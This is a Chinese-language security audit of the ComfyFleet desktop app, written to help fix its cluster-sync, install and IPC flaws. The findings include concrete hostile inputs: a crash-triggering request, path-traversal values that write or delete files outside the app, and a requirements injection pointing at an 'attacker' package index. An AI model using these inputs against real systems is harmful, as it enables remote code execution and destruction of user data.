# ComfyFleet 全量代码审计

- 审计对象：`D:\project\YH_ComfyUI`（React 19 + TypeScript + Tauri 2 + Rust）
- 审计方式：逐文件静态审查；`cargo test`；`tsc --noEmit`；集群/同步、安装/环境/版本、前端三组独立复核
- 审计时结论：**当时的代码不适合直接作为稳定版交付**。最高优先级不是 UI，而是“集群对端输入可直接造成任意文件写入/删除、未认证崩溃”，以及一批**被并进 `//` 注释的生产语句**（取消、超时、取消栅栏实际未执行）。
- **修复状态（2026-11-02）：已按本报告完成 P0/P1 与可落地的 P2/P3 修复，并重新构建、冒烟验证；仍有一项架构级残余风险（见第九节）：显式开放局域网后，通信仍无 TLS。**
- 修复前备份：`audit-fix-backup-20261101-233242.zip`（源码/配置，不含 `target` 与用户数据）。
- 验证基线：`cargo test` **185 passed / 0 failed / 5 ignored**；`tsc --noEmit` 通过；`pnpm run build` 产出 NSIS 安装包；WebView2 CSP 下逐页冒烟无控制台异常。`cargo clippy`/`cargo fmt` 组件未安装，未运行。

---

## 一、先看这个：10 处生产语句 + 1 处测试语句被并进注释，取消/超时逻辑实际不存在

这是一类**自动化“行合并/编码修复”留下的文本损坏**：语句被拼到了上一行 `//` 注释的末尾，编译合法，但永远不会执行。它正好解释了“点了取消没反应”“下载卡住永远不超时”等现象。

| 位置 | 被吞掉的语句 | 实际影响 |
|---|---|---|
| [`cluster.rs:626`](src-tauri/src/cluster.rs#L626) | `stream.set_nonblocking(false)` | Windows 上继承的非阻塞 socket 可能让大文件响应提前失败 |
| [`cluster.rs:628`](src-tauri/src/cluster.rs#L628) | `stream.set_read_timeout(300s)` | HTTP 请求读取没有超时；慢速/半截请求可永久占线程 |
| [`cluster.rs:1196`](src-tauri/src/cluster.rs#L1196) | 幂等拒绝的 `json_response(200, ...)` | 重复拒绝时 socket 空响应，客户端得到传输/JSON 错误 |
| [`cluster.rs:1250`](src-tauri/src/cluster.rs#L1250) | `job.cancel_requested = false` | 任务进入终态后取消标记不清，UI 可能一直显示“正在取消” |
| [`cluster.rs:2576`](src-tauri/src/cluster.rs#L2576) | `job.status = JOB_CANCELLED` | **待确认/排队中的任务根本取消不了，目标端仍会领取并执行** |
| [`cluster.rs:2584`](src-tauri/src/cluster.rs#L2584) | `job.cancel_requested = true` | **运行中的任务收不到取消请求**；UI 仍提示“已请求取消” |
| [`sync.rs:1875`](src-tauri/src/sync.rs#L1875) | `out.target_drift = true` | 旧指纹版本不再触发“目标有漂移，需确认” |
| [`sync.rs:2377`](src-tauri/src/sync.rs#L2377) | `wheel.archive = None` | VCS 自定义包可能残留旧 archive 值 |
| [`sync.rs:2444`](src-tauri/src/sync.rs#L2444) | `manifest.source = source.clone()` | 远端下载后的可用性状态没有回填到 manifest |
| [`sync.rs:3530`](src-tauri/src/sync.rs#L3530) | `cancel_allowed = false` | 模型已落盘后仍可被取消，可能留下半同步目标且没有 lastApplied |
| [`sync.rs:4170`](src-tauri/src/sync.rs#L4170) | 测试里的 `fs::write(... "different")` | 该测试实际上没有制造差异，证明不了它想证明的“核心哈希必须相同” |

**修复建议**

1. 逐行恢复上述语句，不要用正则批量“修乱码”再合并行。
2. CI 增加一个简单检查：`^\s*//.*;\s*$` 且注释后出现赋值/调用/`let` 的行直接报错；再配合 `rustfmt --check`。
3. 给 `cancel_job` 加回归测试：pending 任务取消后，下一次 `next_job` 不能再领取；running 任务取消后，目标端安全点收到 `cancel_requested`。

---

## 二、P0：可远程触发或一键破坏数据

### P0-1 未认证的 HTTP 路径解码 panic，`panic = "abort"` 直接杀进程

- 位置：[`cluster.rs:695-711`](src-tauri/src/cluster.rs#L695-L711)，调用点 [`cluster.rs:651`](src-tauri/src/cluster.rs#L651) / [`cluster.rs:658`](src-tauri/src/cluster.rs#L658)
- 触发：集群端口监听 `0.0.0.0`（[`cluster.rs:545`](src-tauri/src/cluster.rs#L545)）时，任意局域网请求 `GET /%中 HTTP/1.1`。`percent_decode` 用字节下标 `&raw[i+1..i+3]` 切片，`%` 后接多字节 UTF-8 时切在字符中间，`&str` 切片 panic。
- 影响：panic 被 `panic = "abort"`（[`Cargo.toml:48`](src-tauri/Cargo.toml#L48)）变成整个应用退出；不需要 token、不需要加入集群。
- 置信度：**确认**（代码路径 + Rust 切片语义；可补单元测试复现）。
- 修复：在 `&[u8]` 上做百分号解码，最后 `String::from_utf8_lossy`；或先检查 `raw.is_char_boundary(i+1)` / `i+3`。同时把 release 改为 `panic = "unwind"`，给顶层兜底。

### P0-2 集群同步：manifest 里的 archive 路径未校验，可写到实例目录之外

- 位置：[`sync.rs:3458`](src-tauri/src/sync.rs#L3458)，同类路径还有 [`sync.rs:2851`](src-tauri/src/sync.rs#L2851)、[`sync.rs:2992`](src-tauri/src/sync.rs#L2992)、[`sync.rs:3105`](src-tauri/src/sync.rs#L3105)
- 触发：Leader 返回的 `manifest` 中 `archive` 为 `..\..\..\Users\Public\x.zip` 或绝对路径 `C:\...`。`inbox.join(archive.replace('/', "\\"))` 不做 `safe_relative_path` 校验；`download_file` 会 `create_dir_all` + `File::create` 写入该路径。
- 影响：目标机任意位置写文件；`artifact_sha` 也来自同一份 malicious manifest，哈希校验无法阻止。配合启动目录/脚本目录可进一步代码执行。
- 置信度：**确认**（代码路径；需要能作为 Leader 或窃取 token/中间人，见 P1-5 无 TLS）。
- 修复：每一个从 manifest 拼出来的路径都过 `safe_relative_path`；`canonicalize` 后必须 `starts_with(inbox)`；拒绝绝对路径、盘符、UNC、`..`、反斜杠分隔的 `..`。

### P0-3 集群同步：`wheel.name` 未校验，任意目录递归删除

- 位置：[`sync.rs:4028`](src-tauri/src/sync.rs#L4028)，删除在 [`sync.rs:4030`](src-tauri/src/sync.rs#L4030)
- 触发：manifest 的 `custom_wheels[].name = "..\\..\\..\\Users\\Public"`，且 `archive` 以 `env/projects/` 开头。`inbox.join("projects").join(&wheel.name)` 后 `remove_dir_all`。
- 影响：目标机任意目录递归删除，然后解压写入同路径；不需要用户再点一次“删除”。
- 置信度：**确认**（`safe_name` 已存在且用于 node.name，但这里没调用）。
- 修复：`safe_name(&wheel.name)` + 规范化后校验父目录；`remove_dir_all` 前再次确认目标在 `inbox/projects` 下。

### P0-4 集群同步：requirements 注入，目标 venv 安装任意包

- 位置：[`sync.rs:3891-3898`](src-tauri/src/sync.rs#L3891-L3898)
- 触发：manifest 的 `python.packages` 里 `name` 含换行，例如 `foo\n--extra-index-url\nhttp://attacker/simple`；拼成 `{name}=={version}` 写入 requirements，再 `uv pip sync`。
- 影响：目标 venv 从攻击者索引安装包，等价于在目标机执行代码。
- 置信度：**确认**（未做 PEP 503/440 允许字符校验；`uv pip sync` 会解析 requirements 选项）。
- 修复：包名只允许 `[A-Za-z0-9._-]`，版本只允许 PEP 440 字符；拒绝 `\r`、`\n`、空白、`@`、URL；更好的做法是使用 `--require-hashes`。

### P0-5 节点名 `..` 可以删除/重命名整个 ComfyUI，且删除发生在“实例是否运行”检查之前

- 位置：`validate_name` [`commands/nodes.rs:125-138`](src-tauri/src/commands/nodes.rs#L125-L138)；`target_dir` [`commands/nodes.rs:140-146`](src-tauri/src/commands/nodes.rs#L140-L146)；删除 [`commands/nodes.rs:641-655`](src-tauri/src/commands/nodes.rs#L641-L655)；toggle [`commands/nodes.rs:354-380`](src-tauri/src/commands/nodes.rs#L354-L380)
- 触发：`nodes_remove(id, name="..")`。`custom_nodes/..` 就是 `ComfyUI`，`.git` 存在，`is_git=true`，直接 `remove_dir_all(ComfyUI)`；不需要 `allow_manual`，也没有 `.comfyfleet\.instance` 标记检查。`name="."` 或 `"..."` 在 Windows 上解析到 `custom_nodes` 本身，`allow_manual=true` 时删除全部节点。`nodes_toggle(name="..", enabled=false)` 会把 `ComfyUI` 重命名为 `custom_nodes/...disabled`。
- 额外问题：`nodes_remove` 在 [`commands/nodes.rs:654`](src-tauri/src/commands/nodes.rs#L654) 先删除，[`commands/nodes.rs:656`](src-tauri/src/commands/nodes.rs#L656) 才 `ensure_stopped`；实例运行时也会先删再报错。`nodes_toggle` 同样先 rename 再检查。
- 影响：一次 IPC 调用破坏 ComfyUI 本体、模型/输入/输出（own 模式）和全部节点；运行中还会造成文件占用/半删除。
- 置信度：**确认**（Windows 路径解析已由审查复核）。
- 修复：拒绝 `.`、`..`、结尾点/空格、Windows 保留名；join 后 canonicalize，并要求 `parent == custom_nodes`、`file_name == name`；把 `ensure_stopped` 移到所有破坏性操作之前。

---

## 三、P1：正常使用就会遇到的数据丢失、进程/状态问题、安全问题

### P1-1 全新安装没有内置 uv，环境初始化/安装/版本/依赖/快照恢复全部被卡死

- 位置：[`commands/env.rs:321-331`](src-tauri/src/commands/env.rs#L321-L331)；安装包资源只有 [`tauri.conf.json:36`](src-tauri/tauri.conf.json#L36) 的 `resources/mingit.zip`
- 事实：`resolve_uv()` 只查 `PATH`，找不到就返回“当前版本要求系统 PATH 中有 uv（后续会随安装包内置）”。`src-tauri/resources` 里没有 uv；NSIS 也只复制 `mingit.zip`。
- 影响：没有预装 uv 的干净 Windows 上，`env_init` / `env_install` / `version_switch` / `nodes_install_deps` / `snapshot_restore` 等直接报 `UV_NOT_FOUND`。这是发布阻断项，不是“后续里程碑”。
- 修复：随包内置 uv.exe（并校验哈希/版本），或首次启动时下载安装到 `data/tools/uv` 并在 `resolve_uv` 优先使用；错误信息里给可执行的安装步骤。

### P1-2 取消功能实际不工作；模型已落盘后仍可被取消

- 位置：见第一节 [`cluster.rs:2576`](src-tauri/src/cluster.rs#L2576) / [`cluster.rs:2584`](src-tauri/src/cluster.rs#L2584) / [`sync.rs:3530`](src-tauri/src/sync.rs#L3530)
- 影响：排队任务仍会执行；运行任务无法安全停止；模型写入后取消可留下半同步目标且没有 `lastApplied`。
- 修复：恢复语句，并给 `cancel_job` 和目标端安全点补端到端测试。

### P1-3 多个“字节切片”panic：非 ASCII commit/target 直接 abort

- `short_sha`：[`commands/version.rs:433-436`](src-tauri/src/commands/version.rs#L433-L436)，调用 [`commands/version.rs:428`](src-tauri/src/commands/version.rs#L428)、[`522`](src-tauri/src/commands/version.rs#L522)、[`532`](src-tauri/src/commands/version.rs#L532)
- 同步侧：`&c[..c.len().min(10)]` 在 [`sync.rs:3604`](src-tauri/src/sync.rs#L3604)、[`sync.rs:3610`](src-tauri/src/sync.rs#L3610)、[`sync.rs:3953`](src-tauri/src/sync.rs#L3953)、[`commands/cluster.rs:654`](src-tauri/src/commands/cluster.rs#L654)、[`commands/cluster.rs:659`](src-tauri/src/commands/cluster.rs#L659)
- 触发：`version_switch(target="中文字符", kind="commit")`；或恶意成员/Leader 在 commit 字段里放非 ASCII。`short_sha` 在真正执行 git 前就调用。
- 影响：整个应用退出；若正在安装，venv/ComfyUI 可能停在半写状态。
- 修复：全部改为 `chars().take(n).collect::<String>()`；commit 目标先用 `^[0-9a-fA-F]{4,40}$` 校验；release 改 `panic="unwind"` 作为兜底。

### P1-4 没有每实例操作锁：重复安装、边装边启动、start/stop 竞态

- 位置：[`commands/env.rs:354`](src-tauri/src/commands/env.rs#L354) 检查后到 [`461`](src-tauri/src/commands/env.rs#L461) 才 spawn；[`commands/run.rs:95`](src-tauri/src/commands/run.rs#L95) 检查、[`160`](src-tauri/src/commands/run.rs#L160) spawn、[`199`](src-tauri/src/commands/run.rs#L199) 才插入 map；[`commands/version.rs:882`](src-tauri/src/commands/version.rs#L882)、[`commands/deps.rs:1051`](src-tauri/src/commands/deps.rs#L1051)
- 触发：双击安装；安装刚开始时点启动；停止还没结束时再启动；另一个窗口/集群/tray 同时操作。
- 影响：两个 `uv pip install` 写同一 venv；安装写入正在运行的 venv；两个 ComfyUI 抢同一端口；状态和 `run.json` 只记录其中一个进程。
- 额外：`start_instance` 不检查实例状态，`installing`/`updating` 时也能启动；`nodes_install` 在实例运行时仍会安装依赖（只打日志，[`commands/nodes.rs:219`](src-tauri/src/commands/nodes.rs#L219)/[`344`](src-tauri/src/commands/nodes.rs#L344)）。
- 修复：`ops: Mutex<HashMap<instance, OpKind>>`，检查与插入原子完成，RAII 释放；启动前拒绝 `Installing/Updating`；停止要等进程确认退出。

### P1-5 集群没有 TLS，token 明文传输；端口默认绑定 0.0.0.0

- 位置：[`cluster.rs:106`](src-tauri/src/cluster.rs#L106) 固定 `http://`；[`cluster.rs:545`](src-tauri/src/cluster.rs#L545) `0.0.0.0`；token 在请求头 [`cluster.rs:1544-1557`](src-tauri/src/cluster.rs#L1544-L1557)
- 影响：同一局域网/网络路径上的攻击者可窃取 member token，伪造 heartbeat/进度/同步请求；结合 P0-2/P0-3/P0-4 可写文件/删目录/装包。当前“集群信任 Leader”的模型没有在 UI 或文档里明确说明。
- 修复：至少支持 TLS（自签证书固定）或改为仅回环 + SSH 隧道；默认只绑 `127.0.0.1`，显式勾选“允许局域网”后才绑 `0.0.0.0`；文档写清“加入集群 = 允许 Leader 在目标机安装/覆盖代码”。

### P1-6 集群 HTTP 无读/写超时、每连接一个线程，未认证即可拖垮

- 位置：[`cluster.rs:545/568-586`](src-tauri/src/cluster.rs#L545-L586)；读超时语句被注释 [`cluster.rs:628`](src-tauri/src/cluster.rs#L628)；写路径 [`cluster.rs:1473-1482`](src-tauri/src/cluster.rs#L1473-L1482) 无写超时
- 触发：发一个不完整的请求头，或建立大量空闲连接；每个 accept 都 `thread::spawn`，没有上限。`set_read_timeout` 实际未执行，线程可以永久阻塞。
- 影响：控制面线程/内存耗尽，正常成员心跳超时变离线；最简单的未认证 DoS。
- 修复：恢复读超时 + 总 deadline + 写超时；固定大小 worker pool/连接上限；默认回环绑定；对 `/join/begin` 之外也做速率限制。

### P1-7 `stop_instance` 在 taskkill 失败时仍标记 Stopped；PID 复用可能误杀

- 位置：[`commands/run.rs:365-388`](src-tauri/src/commands/run.rs#L365-L388)；[`runtime.rs:496-508`](src-tauri/src/runtime.rs#L496-L508)
- 事实：`kill_pid_tree` 丢弃 `taskkill` 退出码，只要进程能启动就返回 `Ok`；`stop_instance` 最多等 5 秒，然后无条件 `set_state(Stopped)` 并删 `run.json`。`taskkill /PID` 不校验 PID 身份；正常停止路径没有 `verify_process`。
- 影响：进程仍在跑但 UI 显示已停止，端口被占；PID 被系统复用后可能杀掉无关进程树。
- 修复：检查 `taskkill` 退出码；用 `Child` 句柄/PID 身份校验；杀不掉就保持 `Error/Stopping` 并提示；正常停止也先 `verify_process`。

### P1-8 `watch` 180 秒后放弃，但进程和状态留下“启动中”孤儿

- 位置：[`commands/run.rs:281-344`](src-tauri/src/commands/run.rs#L281-L344)
- 影响：模型加载慢的机器 3 分钟后不再监控；如果进程随后退出，UI 永远停在 Starting，`runs` map 里还留着句柄，只有手动停止才清。
- 修复：超时后继续低频监控退出；或超时把状态改为 Error 并保留可控的停止入口；不要静默 break。

### P1-9 `instance_create` 可接管另一个实例的根目录，purge 会删共享根

- 位置：[`commands/instance.rs:201-233`](src-tauri/src/commands/instance.rs#L201-L233)
- 事实：只要目标根已有 `.comfyfleet\.instance`（旧版为根目录 `.comfyfleet-instance`），就跳过“非空目录拒绝”，随后直接覆盖 marker 写入新 id；不校验 marker 内容/id 是否属于当前实例。
- 影响：两个实例登记同一个根；其中一个 `purge` 时 [`commands/instance.rs:1421-1431`](src-tauri/src/commands/instance.rs#L1421-L1431) 只检查 marker 存在，就 `remove_dir_all(root)`，另一个实例和用户数据一起被删。
- 修复：marker 必须存在、可解析、id 与当前实例一致；如果已存在其他 id，明确拒绝；`purge` 前再次核对 cfg.id 与 marker.id；禁止 root 与其他实例根重叠。

### P1-10 `instance_delete` 使用未校验的原始 id，且不检查实例是否在运行

- 位置：[`commands/instance.rs:1389-1441`](src-tauri/src/commands/instance.rs#L1389-L1441)
- 事实：不像 `load_instance` 要求十六进制，`instance_delete` 直接 `instances_dir().join(&id)`；只要目标目录里有 `instance.json` 就 `remove_dir_all`。`id="..\\..\\某目录"` 可删除 app 数据目录之外的、恰好含 `instance.json` 的目录；随后 `snapshot::root(&id)` / `activity::path(&id)` 也用原始 id。
- 影响：路径穿越/越界删除；运行中的实例被直接删文件，进程和句柄留在后台。
- 修复：先 `load_instance` 并校验 `cfg.id == id`；检查 `state.runs`；快照/日志路径也用校验后的 id；`purge` 的 marker 内容与 cfg.id 匹配。

### P1-11 安装/版本子进程没有超时、没有取消，且完成条件依赖管道 EOF

- 位置：[`install.rs:232-300`](src-tauri/src/install.rs#L232-L300)（`for line in rx` 在 `child.wait()` 之前）；[`commands/version.rs:442-453`](src-tauri/src/commands/version.rs#L442-L453)；[`proc.rs:155-219`](src-tauri/src/proc.rs#L155-L219)
- 影响：代理卡住、git 凭据提示、孙进程继承 stdout 等情况会让安装永远停在 `installing`；没有 cancel 命令，用户只能杀应用。前端对应的是全屏、不可关闭的 modal。
- 修复：Job Object/进程组 + 总 deadline；`try_wait` 循环；子进程退出后带 deadline 地 drain 管道；暴露 cancel；前端 modal 可隐藏但后台继续。

### P1-12 安装失败会“毒化”重试：半克隆目录、无回滚、`Installing` 不恢复

- 位置：[`install.rs:458-486`](src-tauri/src/install.rs#L458-L486)（只有 `main.py` 不存在才 clone，失败留下半目录）；[`commands/env.rs:455-492`](src-tauri/src/commands/env.rs#L455-L492)；[`commands/run.rs:534`](src-tauri/src/commands/run.rs#L534) 的 `recover_orphans` 只处理 Running/Starting
- 影响：下一次安装 `git clone` 到已存在目录直接失败；应用崩溃后实例永远停在 `Installing`；torch/venv 被改坏后没有自动回滚。
- 修复：clone 到 `ComfyUI.tmp` 成功后 rename；启动时把 `Installing` 降级为 `Error`；安装前对 venv 做可恢复快照或至少 freeze。

### P1-13 没有 CSP；自定义 IPC 命令对任何 XSS 都是本地代码执行

- 位置：[`tauri.conf.json:29-31`](src-tauri/tauri.conf.json#L29-L31) `"csp": null`；[`capabilities/default.json`](src-tauri/capabilities/default.json) 授予 `opener:default`
- 事实：前端目前没有发现 `dangerouslySetInnerHTML`/`eval` 等直接 sink，但日志、节点名、集群成员名、pip 输出都进入 React 文本；一旦未来加入一个 sink，XSS 可以直接调用 `open_path`（任意文件/可执行文件）、`pty_spawn`（任意名为 `cmd.exe` 的程序）、`nodes_remove` 等自定义命令。
- 修复：加严格 CSP（`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src ipc: http://ipc.localhost` 按 Tauri 实际协议调整）；收紧 `opener:default`；`open_path` 限制到实例根/数据目录，不打开任意 `.exe`；`pty_spawn` 只允许固定绝对路径。

### P1-14 前端：Console 会启动两个 PTY，卸载时泄漏

- 位置：[`Console.tsx:204-255`](src/views/Console.tsx#L204-L255)，guard 在 [`208`](src/views/Console.tsx#L208)，`spawningRef=true` 在 [`218`](src/views/Console.tsx#L218)，自动连接 [`266-274`](src/views/Console.tsx#L266-L274)，按钮 [`335`](src/views/Console.tsx#L335)
- 事实：`attach` 只检查 `sessionRef.current`，不检查 `spawningRef.current`；auto timer 和点击可以同时进入，两个 `pty_spawn_instance` 都成功，后一个覆盖 `sessionRef`，第一个 PTY 永久泄漏。卸载时 [`187-200`](src/views/Console.tsx#L187-L200) 只杀 `sessionRef.current`，spawn 还没返回时它为空；promise 返回后仍写已 `dispose()` 的 xterm。
- 修复：`if (spawningRef.current || sessionRef.current) return`；`finally` 清 `spawningRef`；本地 `disposed` 标志，await 返回后若已卸载立即 `ptyKill(id)`；事件回调检查 `disposed`。

### P1-15 前端：快照恢复确认使用可能几小时前的缓存预览，默认还删除多余项

- 位置：[`Snapshots.tsx:457-468`](src/views/Snapshots.tsx#L457-L468) 优先 `rowDiffs[id]`；默认 [`349-352`](src/views/Snapshots.tsx#L349-L352) `removeExtraNodes/removeExtraPackages: true`
- 影响：确认框里的数量/复选框来自旧预览，真正 `snapshotRestore` 会按当前状态重新规划；用户可能在错误的数量下确认删除节点/包。
- 修复：`askRestore` 总是重新取 preview，或打开确认框时强制刷新并在请求完成前禁用“确认恢复”。

---

## 四、P2：条件触发/中等风险

| 编号 | 位置 | 问题 | 触发/影响 | 置信度 |
|---|---|---|---|---|
| P2-1 | [`snapshot.rs:154`](src-tauri/src/snapshot.rs#L154) / [`commands/snapshot.rs:113-116`](src-tauri/src/commands/snapshot.rs#L113-L116)、[`192-195`](src-tauri/src/commands/snapshot.rs#L192-L195) | `snapshot_list`/`snapshot_delete` 不 `load_instance`，直接用原始 `instance_id` 拼 `snapshots/<id>` | 可列出/删除 app 快照目录之外、恰好有快照 JSON 的目录；与 `instance_delete` 同类越界 | 确认 |
| P2-2 | [`activity.rs:60`](src-tauri/src/activity.rs#L60) | `path(instance_id)` 直接拼原始 id | `instance_delete` 等调用时可越界删除日志文件 | 确认 |
| P2-3 | [`commands/version.rs:494-526`](src-tauri/src/commands/version.rs#L494-L526) | `target` 未校验就作为 git 参数；`checkout -B`/`fetch` 可把 `--orphan`/`--upload-pack` 当选项 | 本地/ssh origin 下可执行程序或清空工作区；当前 UI 只传 tag/sha，属 IPC 边界问题 | 机制确认，触发条件依赖调用方 |
| P2-4 | [`commands/version.rs:568`](src-tauri/src/commands/version.rs#L568) | `merge --ff-only` 任何失败都 `reset --hard FETCH_HEAD` | 非“无共同祖先”的失败也会丢弃本地提交（只留 reflog）；dirty 检查早于 fetch | 确认（状态）；触发面推测 |
| P2-5 | [`commands/version.rs:648-651`](src-tauri/src/commands/version.rs#L648-L651) | `freeze(...).unwrap_or_default()`；freeze 失败就没 `--constraint` | 切版本后 torch/torchvision 可被无约束重装，CUDA→CPU/DLL 破坏 | 确认 |
| P2-6 | [`commands/version.rs:895-899`](src-tauri/src/commands/version.rs#L895-L899)、[`1012-1016`](src-tauri/src/commands/version.rs#L1012-L1016)；[`snapshot.rs:744-757`](src-tauri/src/snapshot.rs#L744-L757) | 更新前快照是 best-effort，失败只 log；错误文案却让用户回滚到“切换前” | 快照失败 + 依赖失败时没有退路 | 确认 |
| P2-7 | [`commands/version.rs:1023-1027`](src-tauri/src/commands/version.rs#L1023-L1027) | `version_update` 成功后没有 `state=Ready`；旧的 Error 红标会一直保留 | 健康实例显示错误 | 确认 |
| P2-8 | [`commands/nodes.rs:210-215`](src-tauri/src/commands/nodes.rs#L210-L215) | 只检查 `starts_with("http")`/`git@`；`httpfoo` 会被 git 当本地路径 clone，然后默认跑 `install.py` | 本地目录被复制进 custom_nodes 并执行代码；ssh URL 使用用户密钥 | 确认 |
| P2-9 | [`commands/deps.rs:583-590`](src-tauri/src/commands/deps.rs#L583-L590)、[`commands/nodes.rs:306`](src-tauri/src/commands/nodes.rs#L306) | `config.allow_install_script` 默认 false 但全项目没有读取；`DepsOptions.run_install_py` 默认 true，nodes_install 复用默认 | 用户以为“禁止脚本”生效，实际 clone 后立即执行 install.py | 确认 |
| P2-10 | [`commands/deps.rs:1105-1108`](src-tauri/src/commands/deps.rs#L1105-L1108) | 补依赖不按 `enabled` 过滤 | “全部补依赖”会执行已禁用节点的 requirements/install.py | 确认 |
| P2-11 | [`accel.rs:1135-1203`](src-tauri/src/accel.rs#L1135-L1203) | 从 URL 最后一段取文件名不校验分隔符/`..`；METADATA 的 version 也直接拼路径 | 特制 URL + 版本不匹配的 wheel 可覆盖/删除 downloads 之外的已有文件 | 确认（需可控 target） |
| P2-12 | [`accel.rs:1145-1162`](src-tauri/src/accel.rs#L1145-L1162) | 第三方 wheel 无大小上限、无哈希、未 `https_only`、可跟随降级重定向 | 供应链/中间人投毒后安装库代码；大响应填满磁盘 | 确认 |
| P2-13 | [`commands/deps.rs:690-714`](src-tauri/src/commands/deps.rs#L690-L714) | `install.py` 超时只 `child.kill()`，不杀子进程；输出先整文件读再截 2000 字符 | pip/编译器子进程在超时后继续改 venv；日志可 OOM/填盘 | 确认 |
| P2-14 | [`git.rs:92-117`](src-tauri/src/git.rs#L92-L117) | MinGit 解压只按 `/` 切分，不拒绝 `\`、盘符、UNC；无锁、无二进制校验 | 只有 `mingit.zip` 被篡改/半写时才可越界写；首次启动竞态会留下损坏 MinGit | 确认代码，低可达性 |
| P2-15 | [`commands/run.rs:516-524`](src-tauri/src/commands/run.rs#L516-L524)、[`pty.rs:24-52`](src-tauri/src/pty.rs#L24-L52) | 应用退出只 `shutdown_all` 运行实例，不杀 `state.ptys`；`PtySession` 没有 Drop | 打开过的环境终端 cmd/conhost 留在后台 | 确认 |
| P2-16 | [`commands/pty.rs:32-43`](src-tauri/src/commands/pty.rs#L32-L43) | `cmd_safe` 过滤 `&|<>^"%()` 但不处理 CR/LF；实例名 `validate_name` 允许控制字符 | 名称含换行时可在 `cmd /K` 的 title 行注入命令；直接 IPC/被篡改 JSON 可达 | 确认（需非 UI 输入） |
| P2-17 | [`commands/pty.rs:15-27`](src-tauri/src/commands/pty.rs#L15-L27) | 只校验 basename 是 `cmd.exe` | 任意目录下名为 cmd.exe 的程序都能启动；XSS 下可执行任意程序 | 确认 |
| P2-18 | [`commands/app.rs:58-70`](src-tauri/src/commands/app.rs#L58-L70) | `open_path` 打开任意存在路径，包括 `.exe` | XSS/恶意配置可借用户点击启动程序；正常 UI 路径可信 | 确认（边界） |
| P2-19 | [`config.rs:822-838`](src-tauri/src/config.rs#L822-L838) | `atomic_write` 固定 `.tmp` 文件名；`instance.json` 多处 read-modify-write | 两次并发写共享临时文件可截断；`env_install` 用安装前 `inst.clone()` 最后保存，覆盖期间用户改的端口/存储；watch 线程的 `set_state(Stopped)` 可覆盖版本切换的 Ready | 确认 |
| P2-20 | [`commands/run.rs:19-34`](src-tauri/src/commands/run.rs#L19-L34) | `set_state` 无锁，load-modify-save | 与 P2-19 同类，状态可能回退 | 确认 |
| P2-21 | [`src/views/InstanceSettings.tsx:304-325`](src/views/InstanceSettings.tsx#L304-L325) | 先保存新 engine/python（可能挪走 venv），再自动安装；安装失败只关 modal | 实例停在 `Uninitialized`，旧 venv 已变 `.venv.bak-*`，没有持久警告 | 确认 |
| P2-22 | [`src/views/LaunchArgs.tsx:78-152`](src/views/LaunchArgs.tsx#L78-L152) | 空端口预览 8188、保存发 0；保存后不回写本地 state | 保存失败/永久“未保存”；>65535 只会得到泛化 IPC 错误 | 确认 |
| P2-23 | [`src/views/InstanceStorage.tsx`](src/views/InstanceStorage.tsx) | `form/baseline` 只初始化一次，不跟 `inst.storage` 变化 | 集群同步/外部修改后，旧表单保存会覆盖新配置；`plan` 请求可乱序 | 确认 |
| P2-24 | [`src/views/InstanceSettings.tsx:78`](src/views/InstanceSettings.tsx#L78)、[`130-164`](src/views/InstanceSettings.tsx#L130-L164) | dirty 用原始值，本地用 `pythonMinor`；保存后不回写 | 旧数据首次进入就“未保存”；成功保存后仍“未保存” | 确认 |
| P2-25 | [`src/views/Settings.tsx:519-542`](src/views/Settings.tsx#L519-L542) | `sync.removeExtraNodes/removeExtraModels` 没有任何代码读取；member confirm 硬编码 false | 设置项无效；文案承诺的“预览里可取消”也不存在 | 确认 |
| P2-26 | [`src/views/Cluster.tsx:943-976`](src/views/Cluster.tsx#L943-L976)、[`1039-1056`](src/views/Cluster.tsx#L1039-L1056) | 2.5s/10s 轮询无序号/in-flight 防护；`doLeave` 本地置 `role:none` 后旧响应可覆盖 | 退出集群后界面又跳回旧页面；变化面板显示上一个源的数据 | 确认 |
| P2-27 | [`src/views/Cluster.tsx:1017-1037`](src/views/Cluster.tsx#L1017-L1037)、[`1203-1212`](src/views/Cluster.tsx#L1203-L1212) | 默认目标 `state !== 'running'`，`starting/installing/stopping/uninitialized` 都可被选中；确认时重新读 id 但不校验 | 确认到正在安装/启动/停止的实例，同步写入冲突 | 确认 |
| P2-28 | [`src/App.tsx:126-129`](src/App.tsx#L126-L129)、[`307-310`](src/App.tsx#L307-L310) | 切换实例 `key={selected.id}` 卸载详情页，无 dirty 检查 | LaunchArgs/Storage/Settings 草稿静默丢失 | 确认 |
| P2-29 | [`src/views/Settings.tsx:68-94`](src/views/Settings.tsx#L68-L94) | 日志上限只在 blur 提交，Ctrl+S 读旧值 | 页面显示“已保存”，实际保存旧值 | 确认 |
| P2-30 | [`src-tauri/target/release/nsis/x64/installer.nsi:867-882`](src-tauri/target/release/nsis/x64/installer.nsi#L867-L882) | “删除应用数据”只删 `%APPDATA%`/`%LOCALAPPDATA%`；实际数据在 `$INSTDIR\data`（[`config.rs:54`](src-tauri/src/config.rs#L54)） | 勾选后数据仍在，卸载也删不掉 `$INSTDIR`；文案误导 | 确认 |
| P2-31 | [`src-tauri/src/lib.rs:155-167`](src-tauri/src/lib.rs#L155-L167) | single-instance 回调只 `unminimize`/`set_focus`，没有 `show()` | 窗口隐藏到托盘后再次启动，可能不显示 | 确认 |
| P2-32 | [`commands/run.rs:398-420`](src-tauri/src/commands/run.rs#L398-L420)、[`431-468`](src-tauri/src/commands/run.rs#L431-L468) | `read_latest_log` 整文件读；`instance_log_state` 的 `lines` 无上限 | 日志增长后内存/卡顿；前端可请求超大行数 | 确认 |

---

## 五、P3：清理项、未明确、文案/交互不一致

1. **`.rs.new` 是过期损坏快照**：[`accel.rs.new`](src-tauri/src/accel.rs.new)、[`cluster.rs.new`](src-tauri/src/cluster.rs.new)、[`sync.rs.new`](src-tauri/src/sync.rs.new)。它们不参与编译，且比 active 文件旧；不要当“未完成代码”恢复，直接删除，避免后续误合并（active 文件反而包含 `.new` 缺少的修复）。
2. **`engine="custom"` 不一致**：[`commands/instance.rs:93`](src-tauri/src/commands/instance.rs#L93) 允许 custom 返回 None，但 [`apply_update`](src-tauri/src/commands/instance.rs#L1124-L1134) 只接受矩阵里的 engine；创建出 custom 实例后编辑/安装会报 `ENGINE_UNKNOWN`。
3. **`channel` 未校验**：`instance_create`/`apply_update` 接受任意字符串；只有 `"dev"` 有特殊分支，其他值静默当 stable。建议白名单 `stable/dev`。
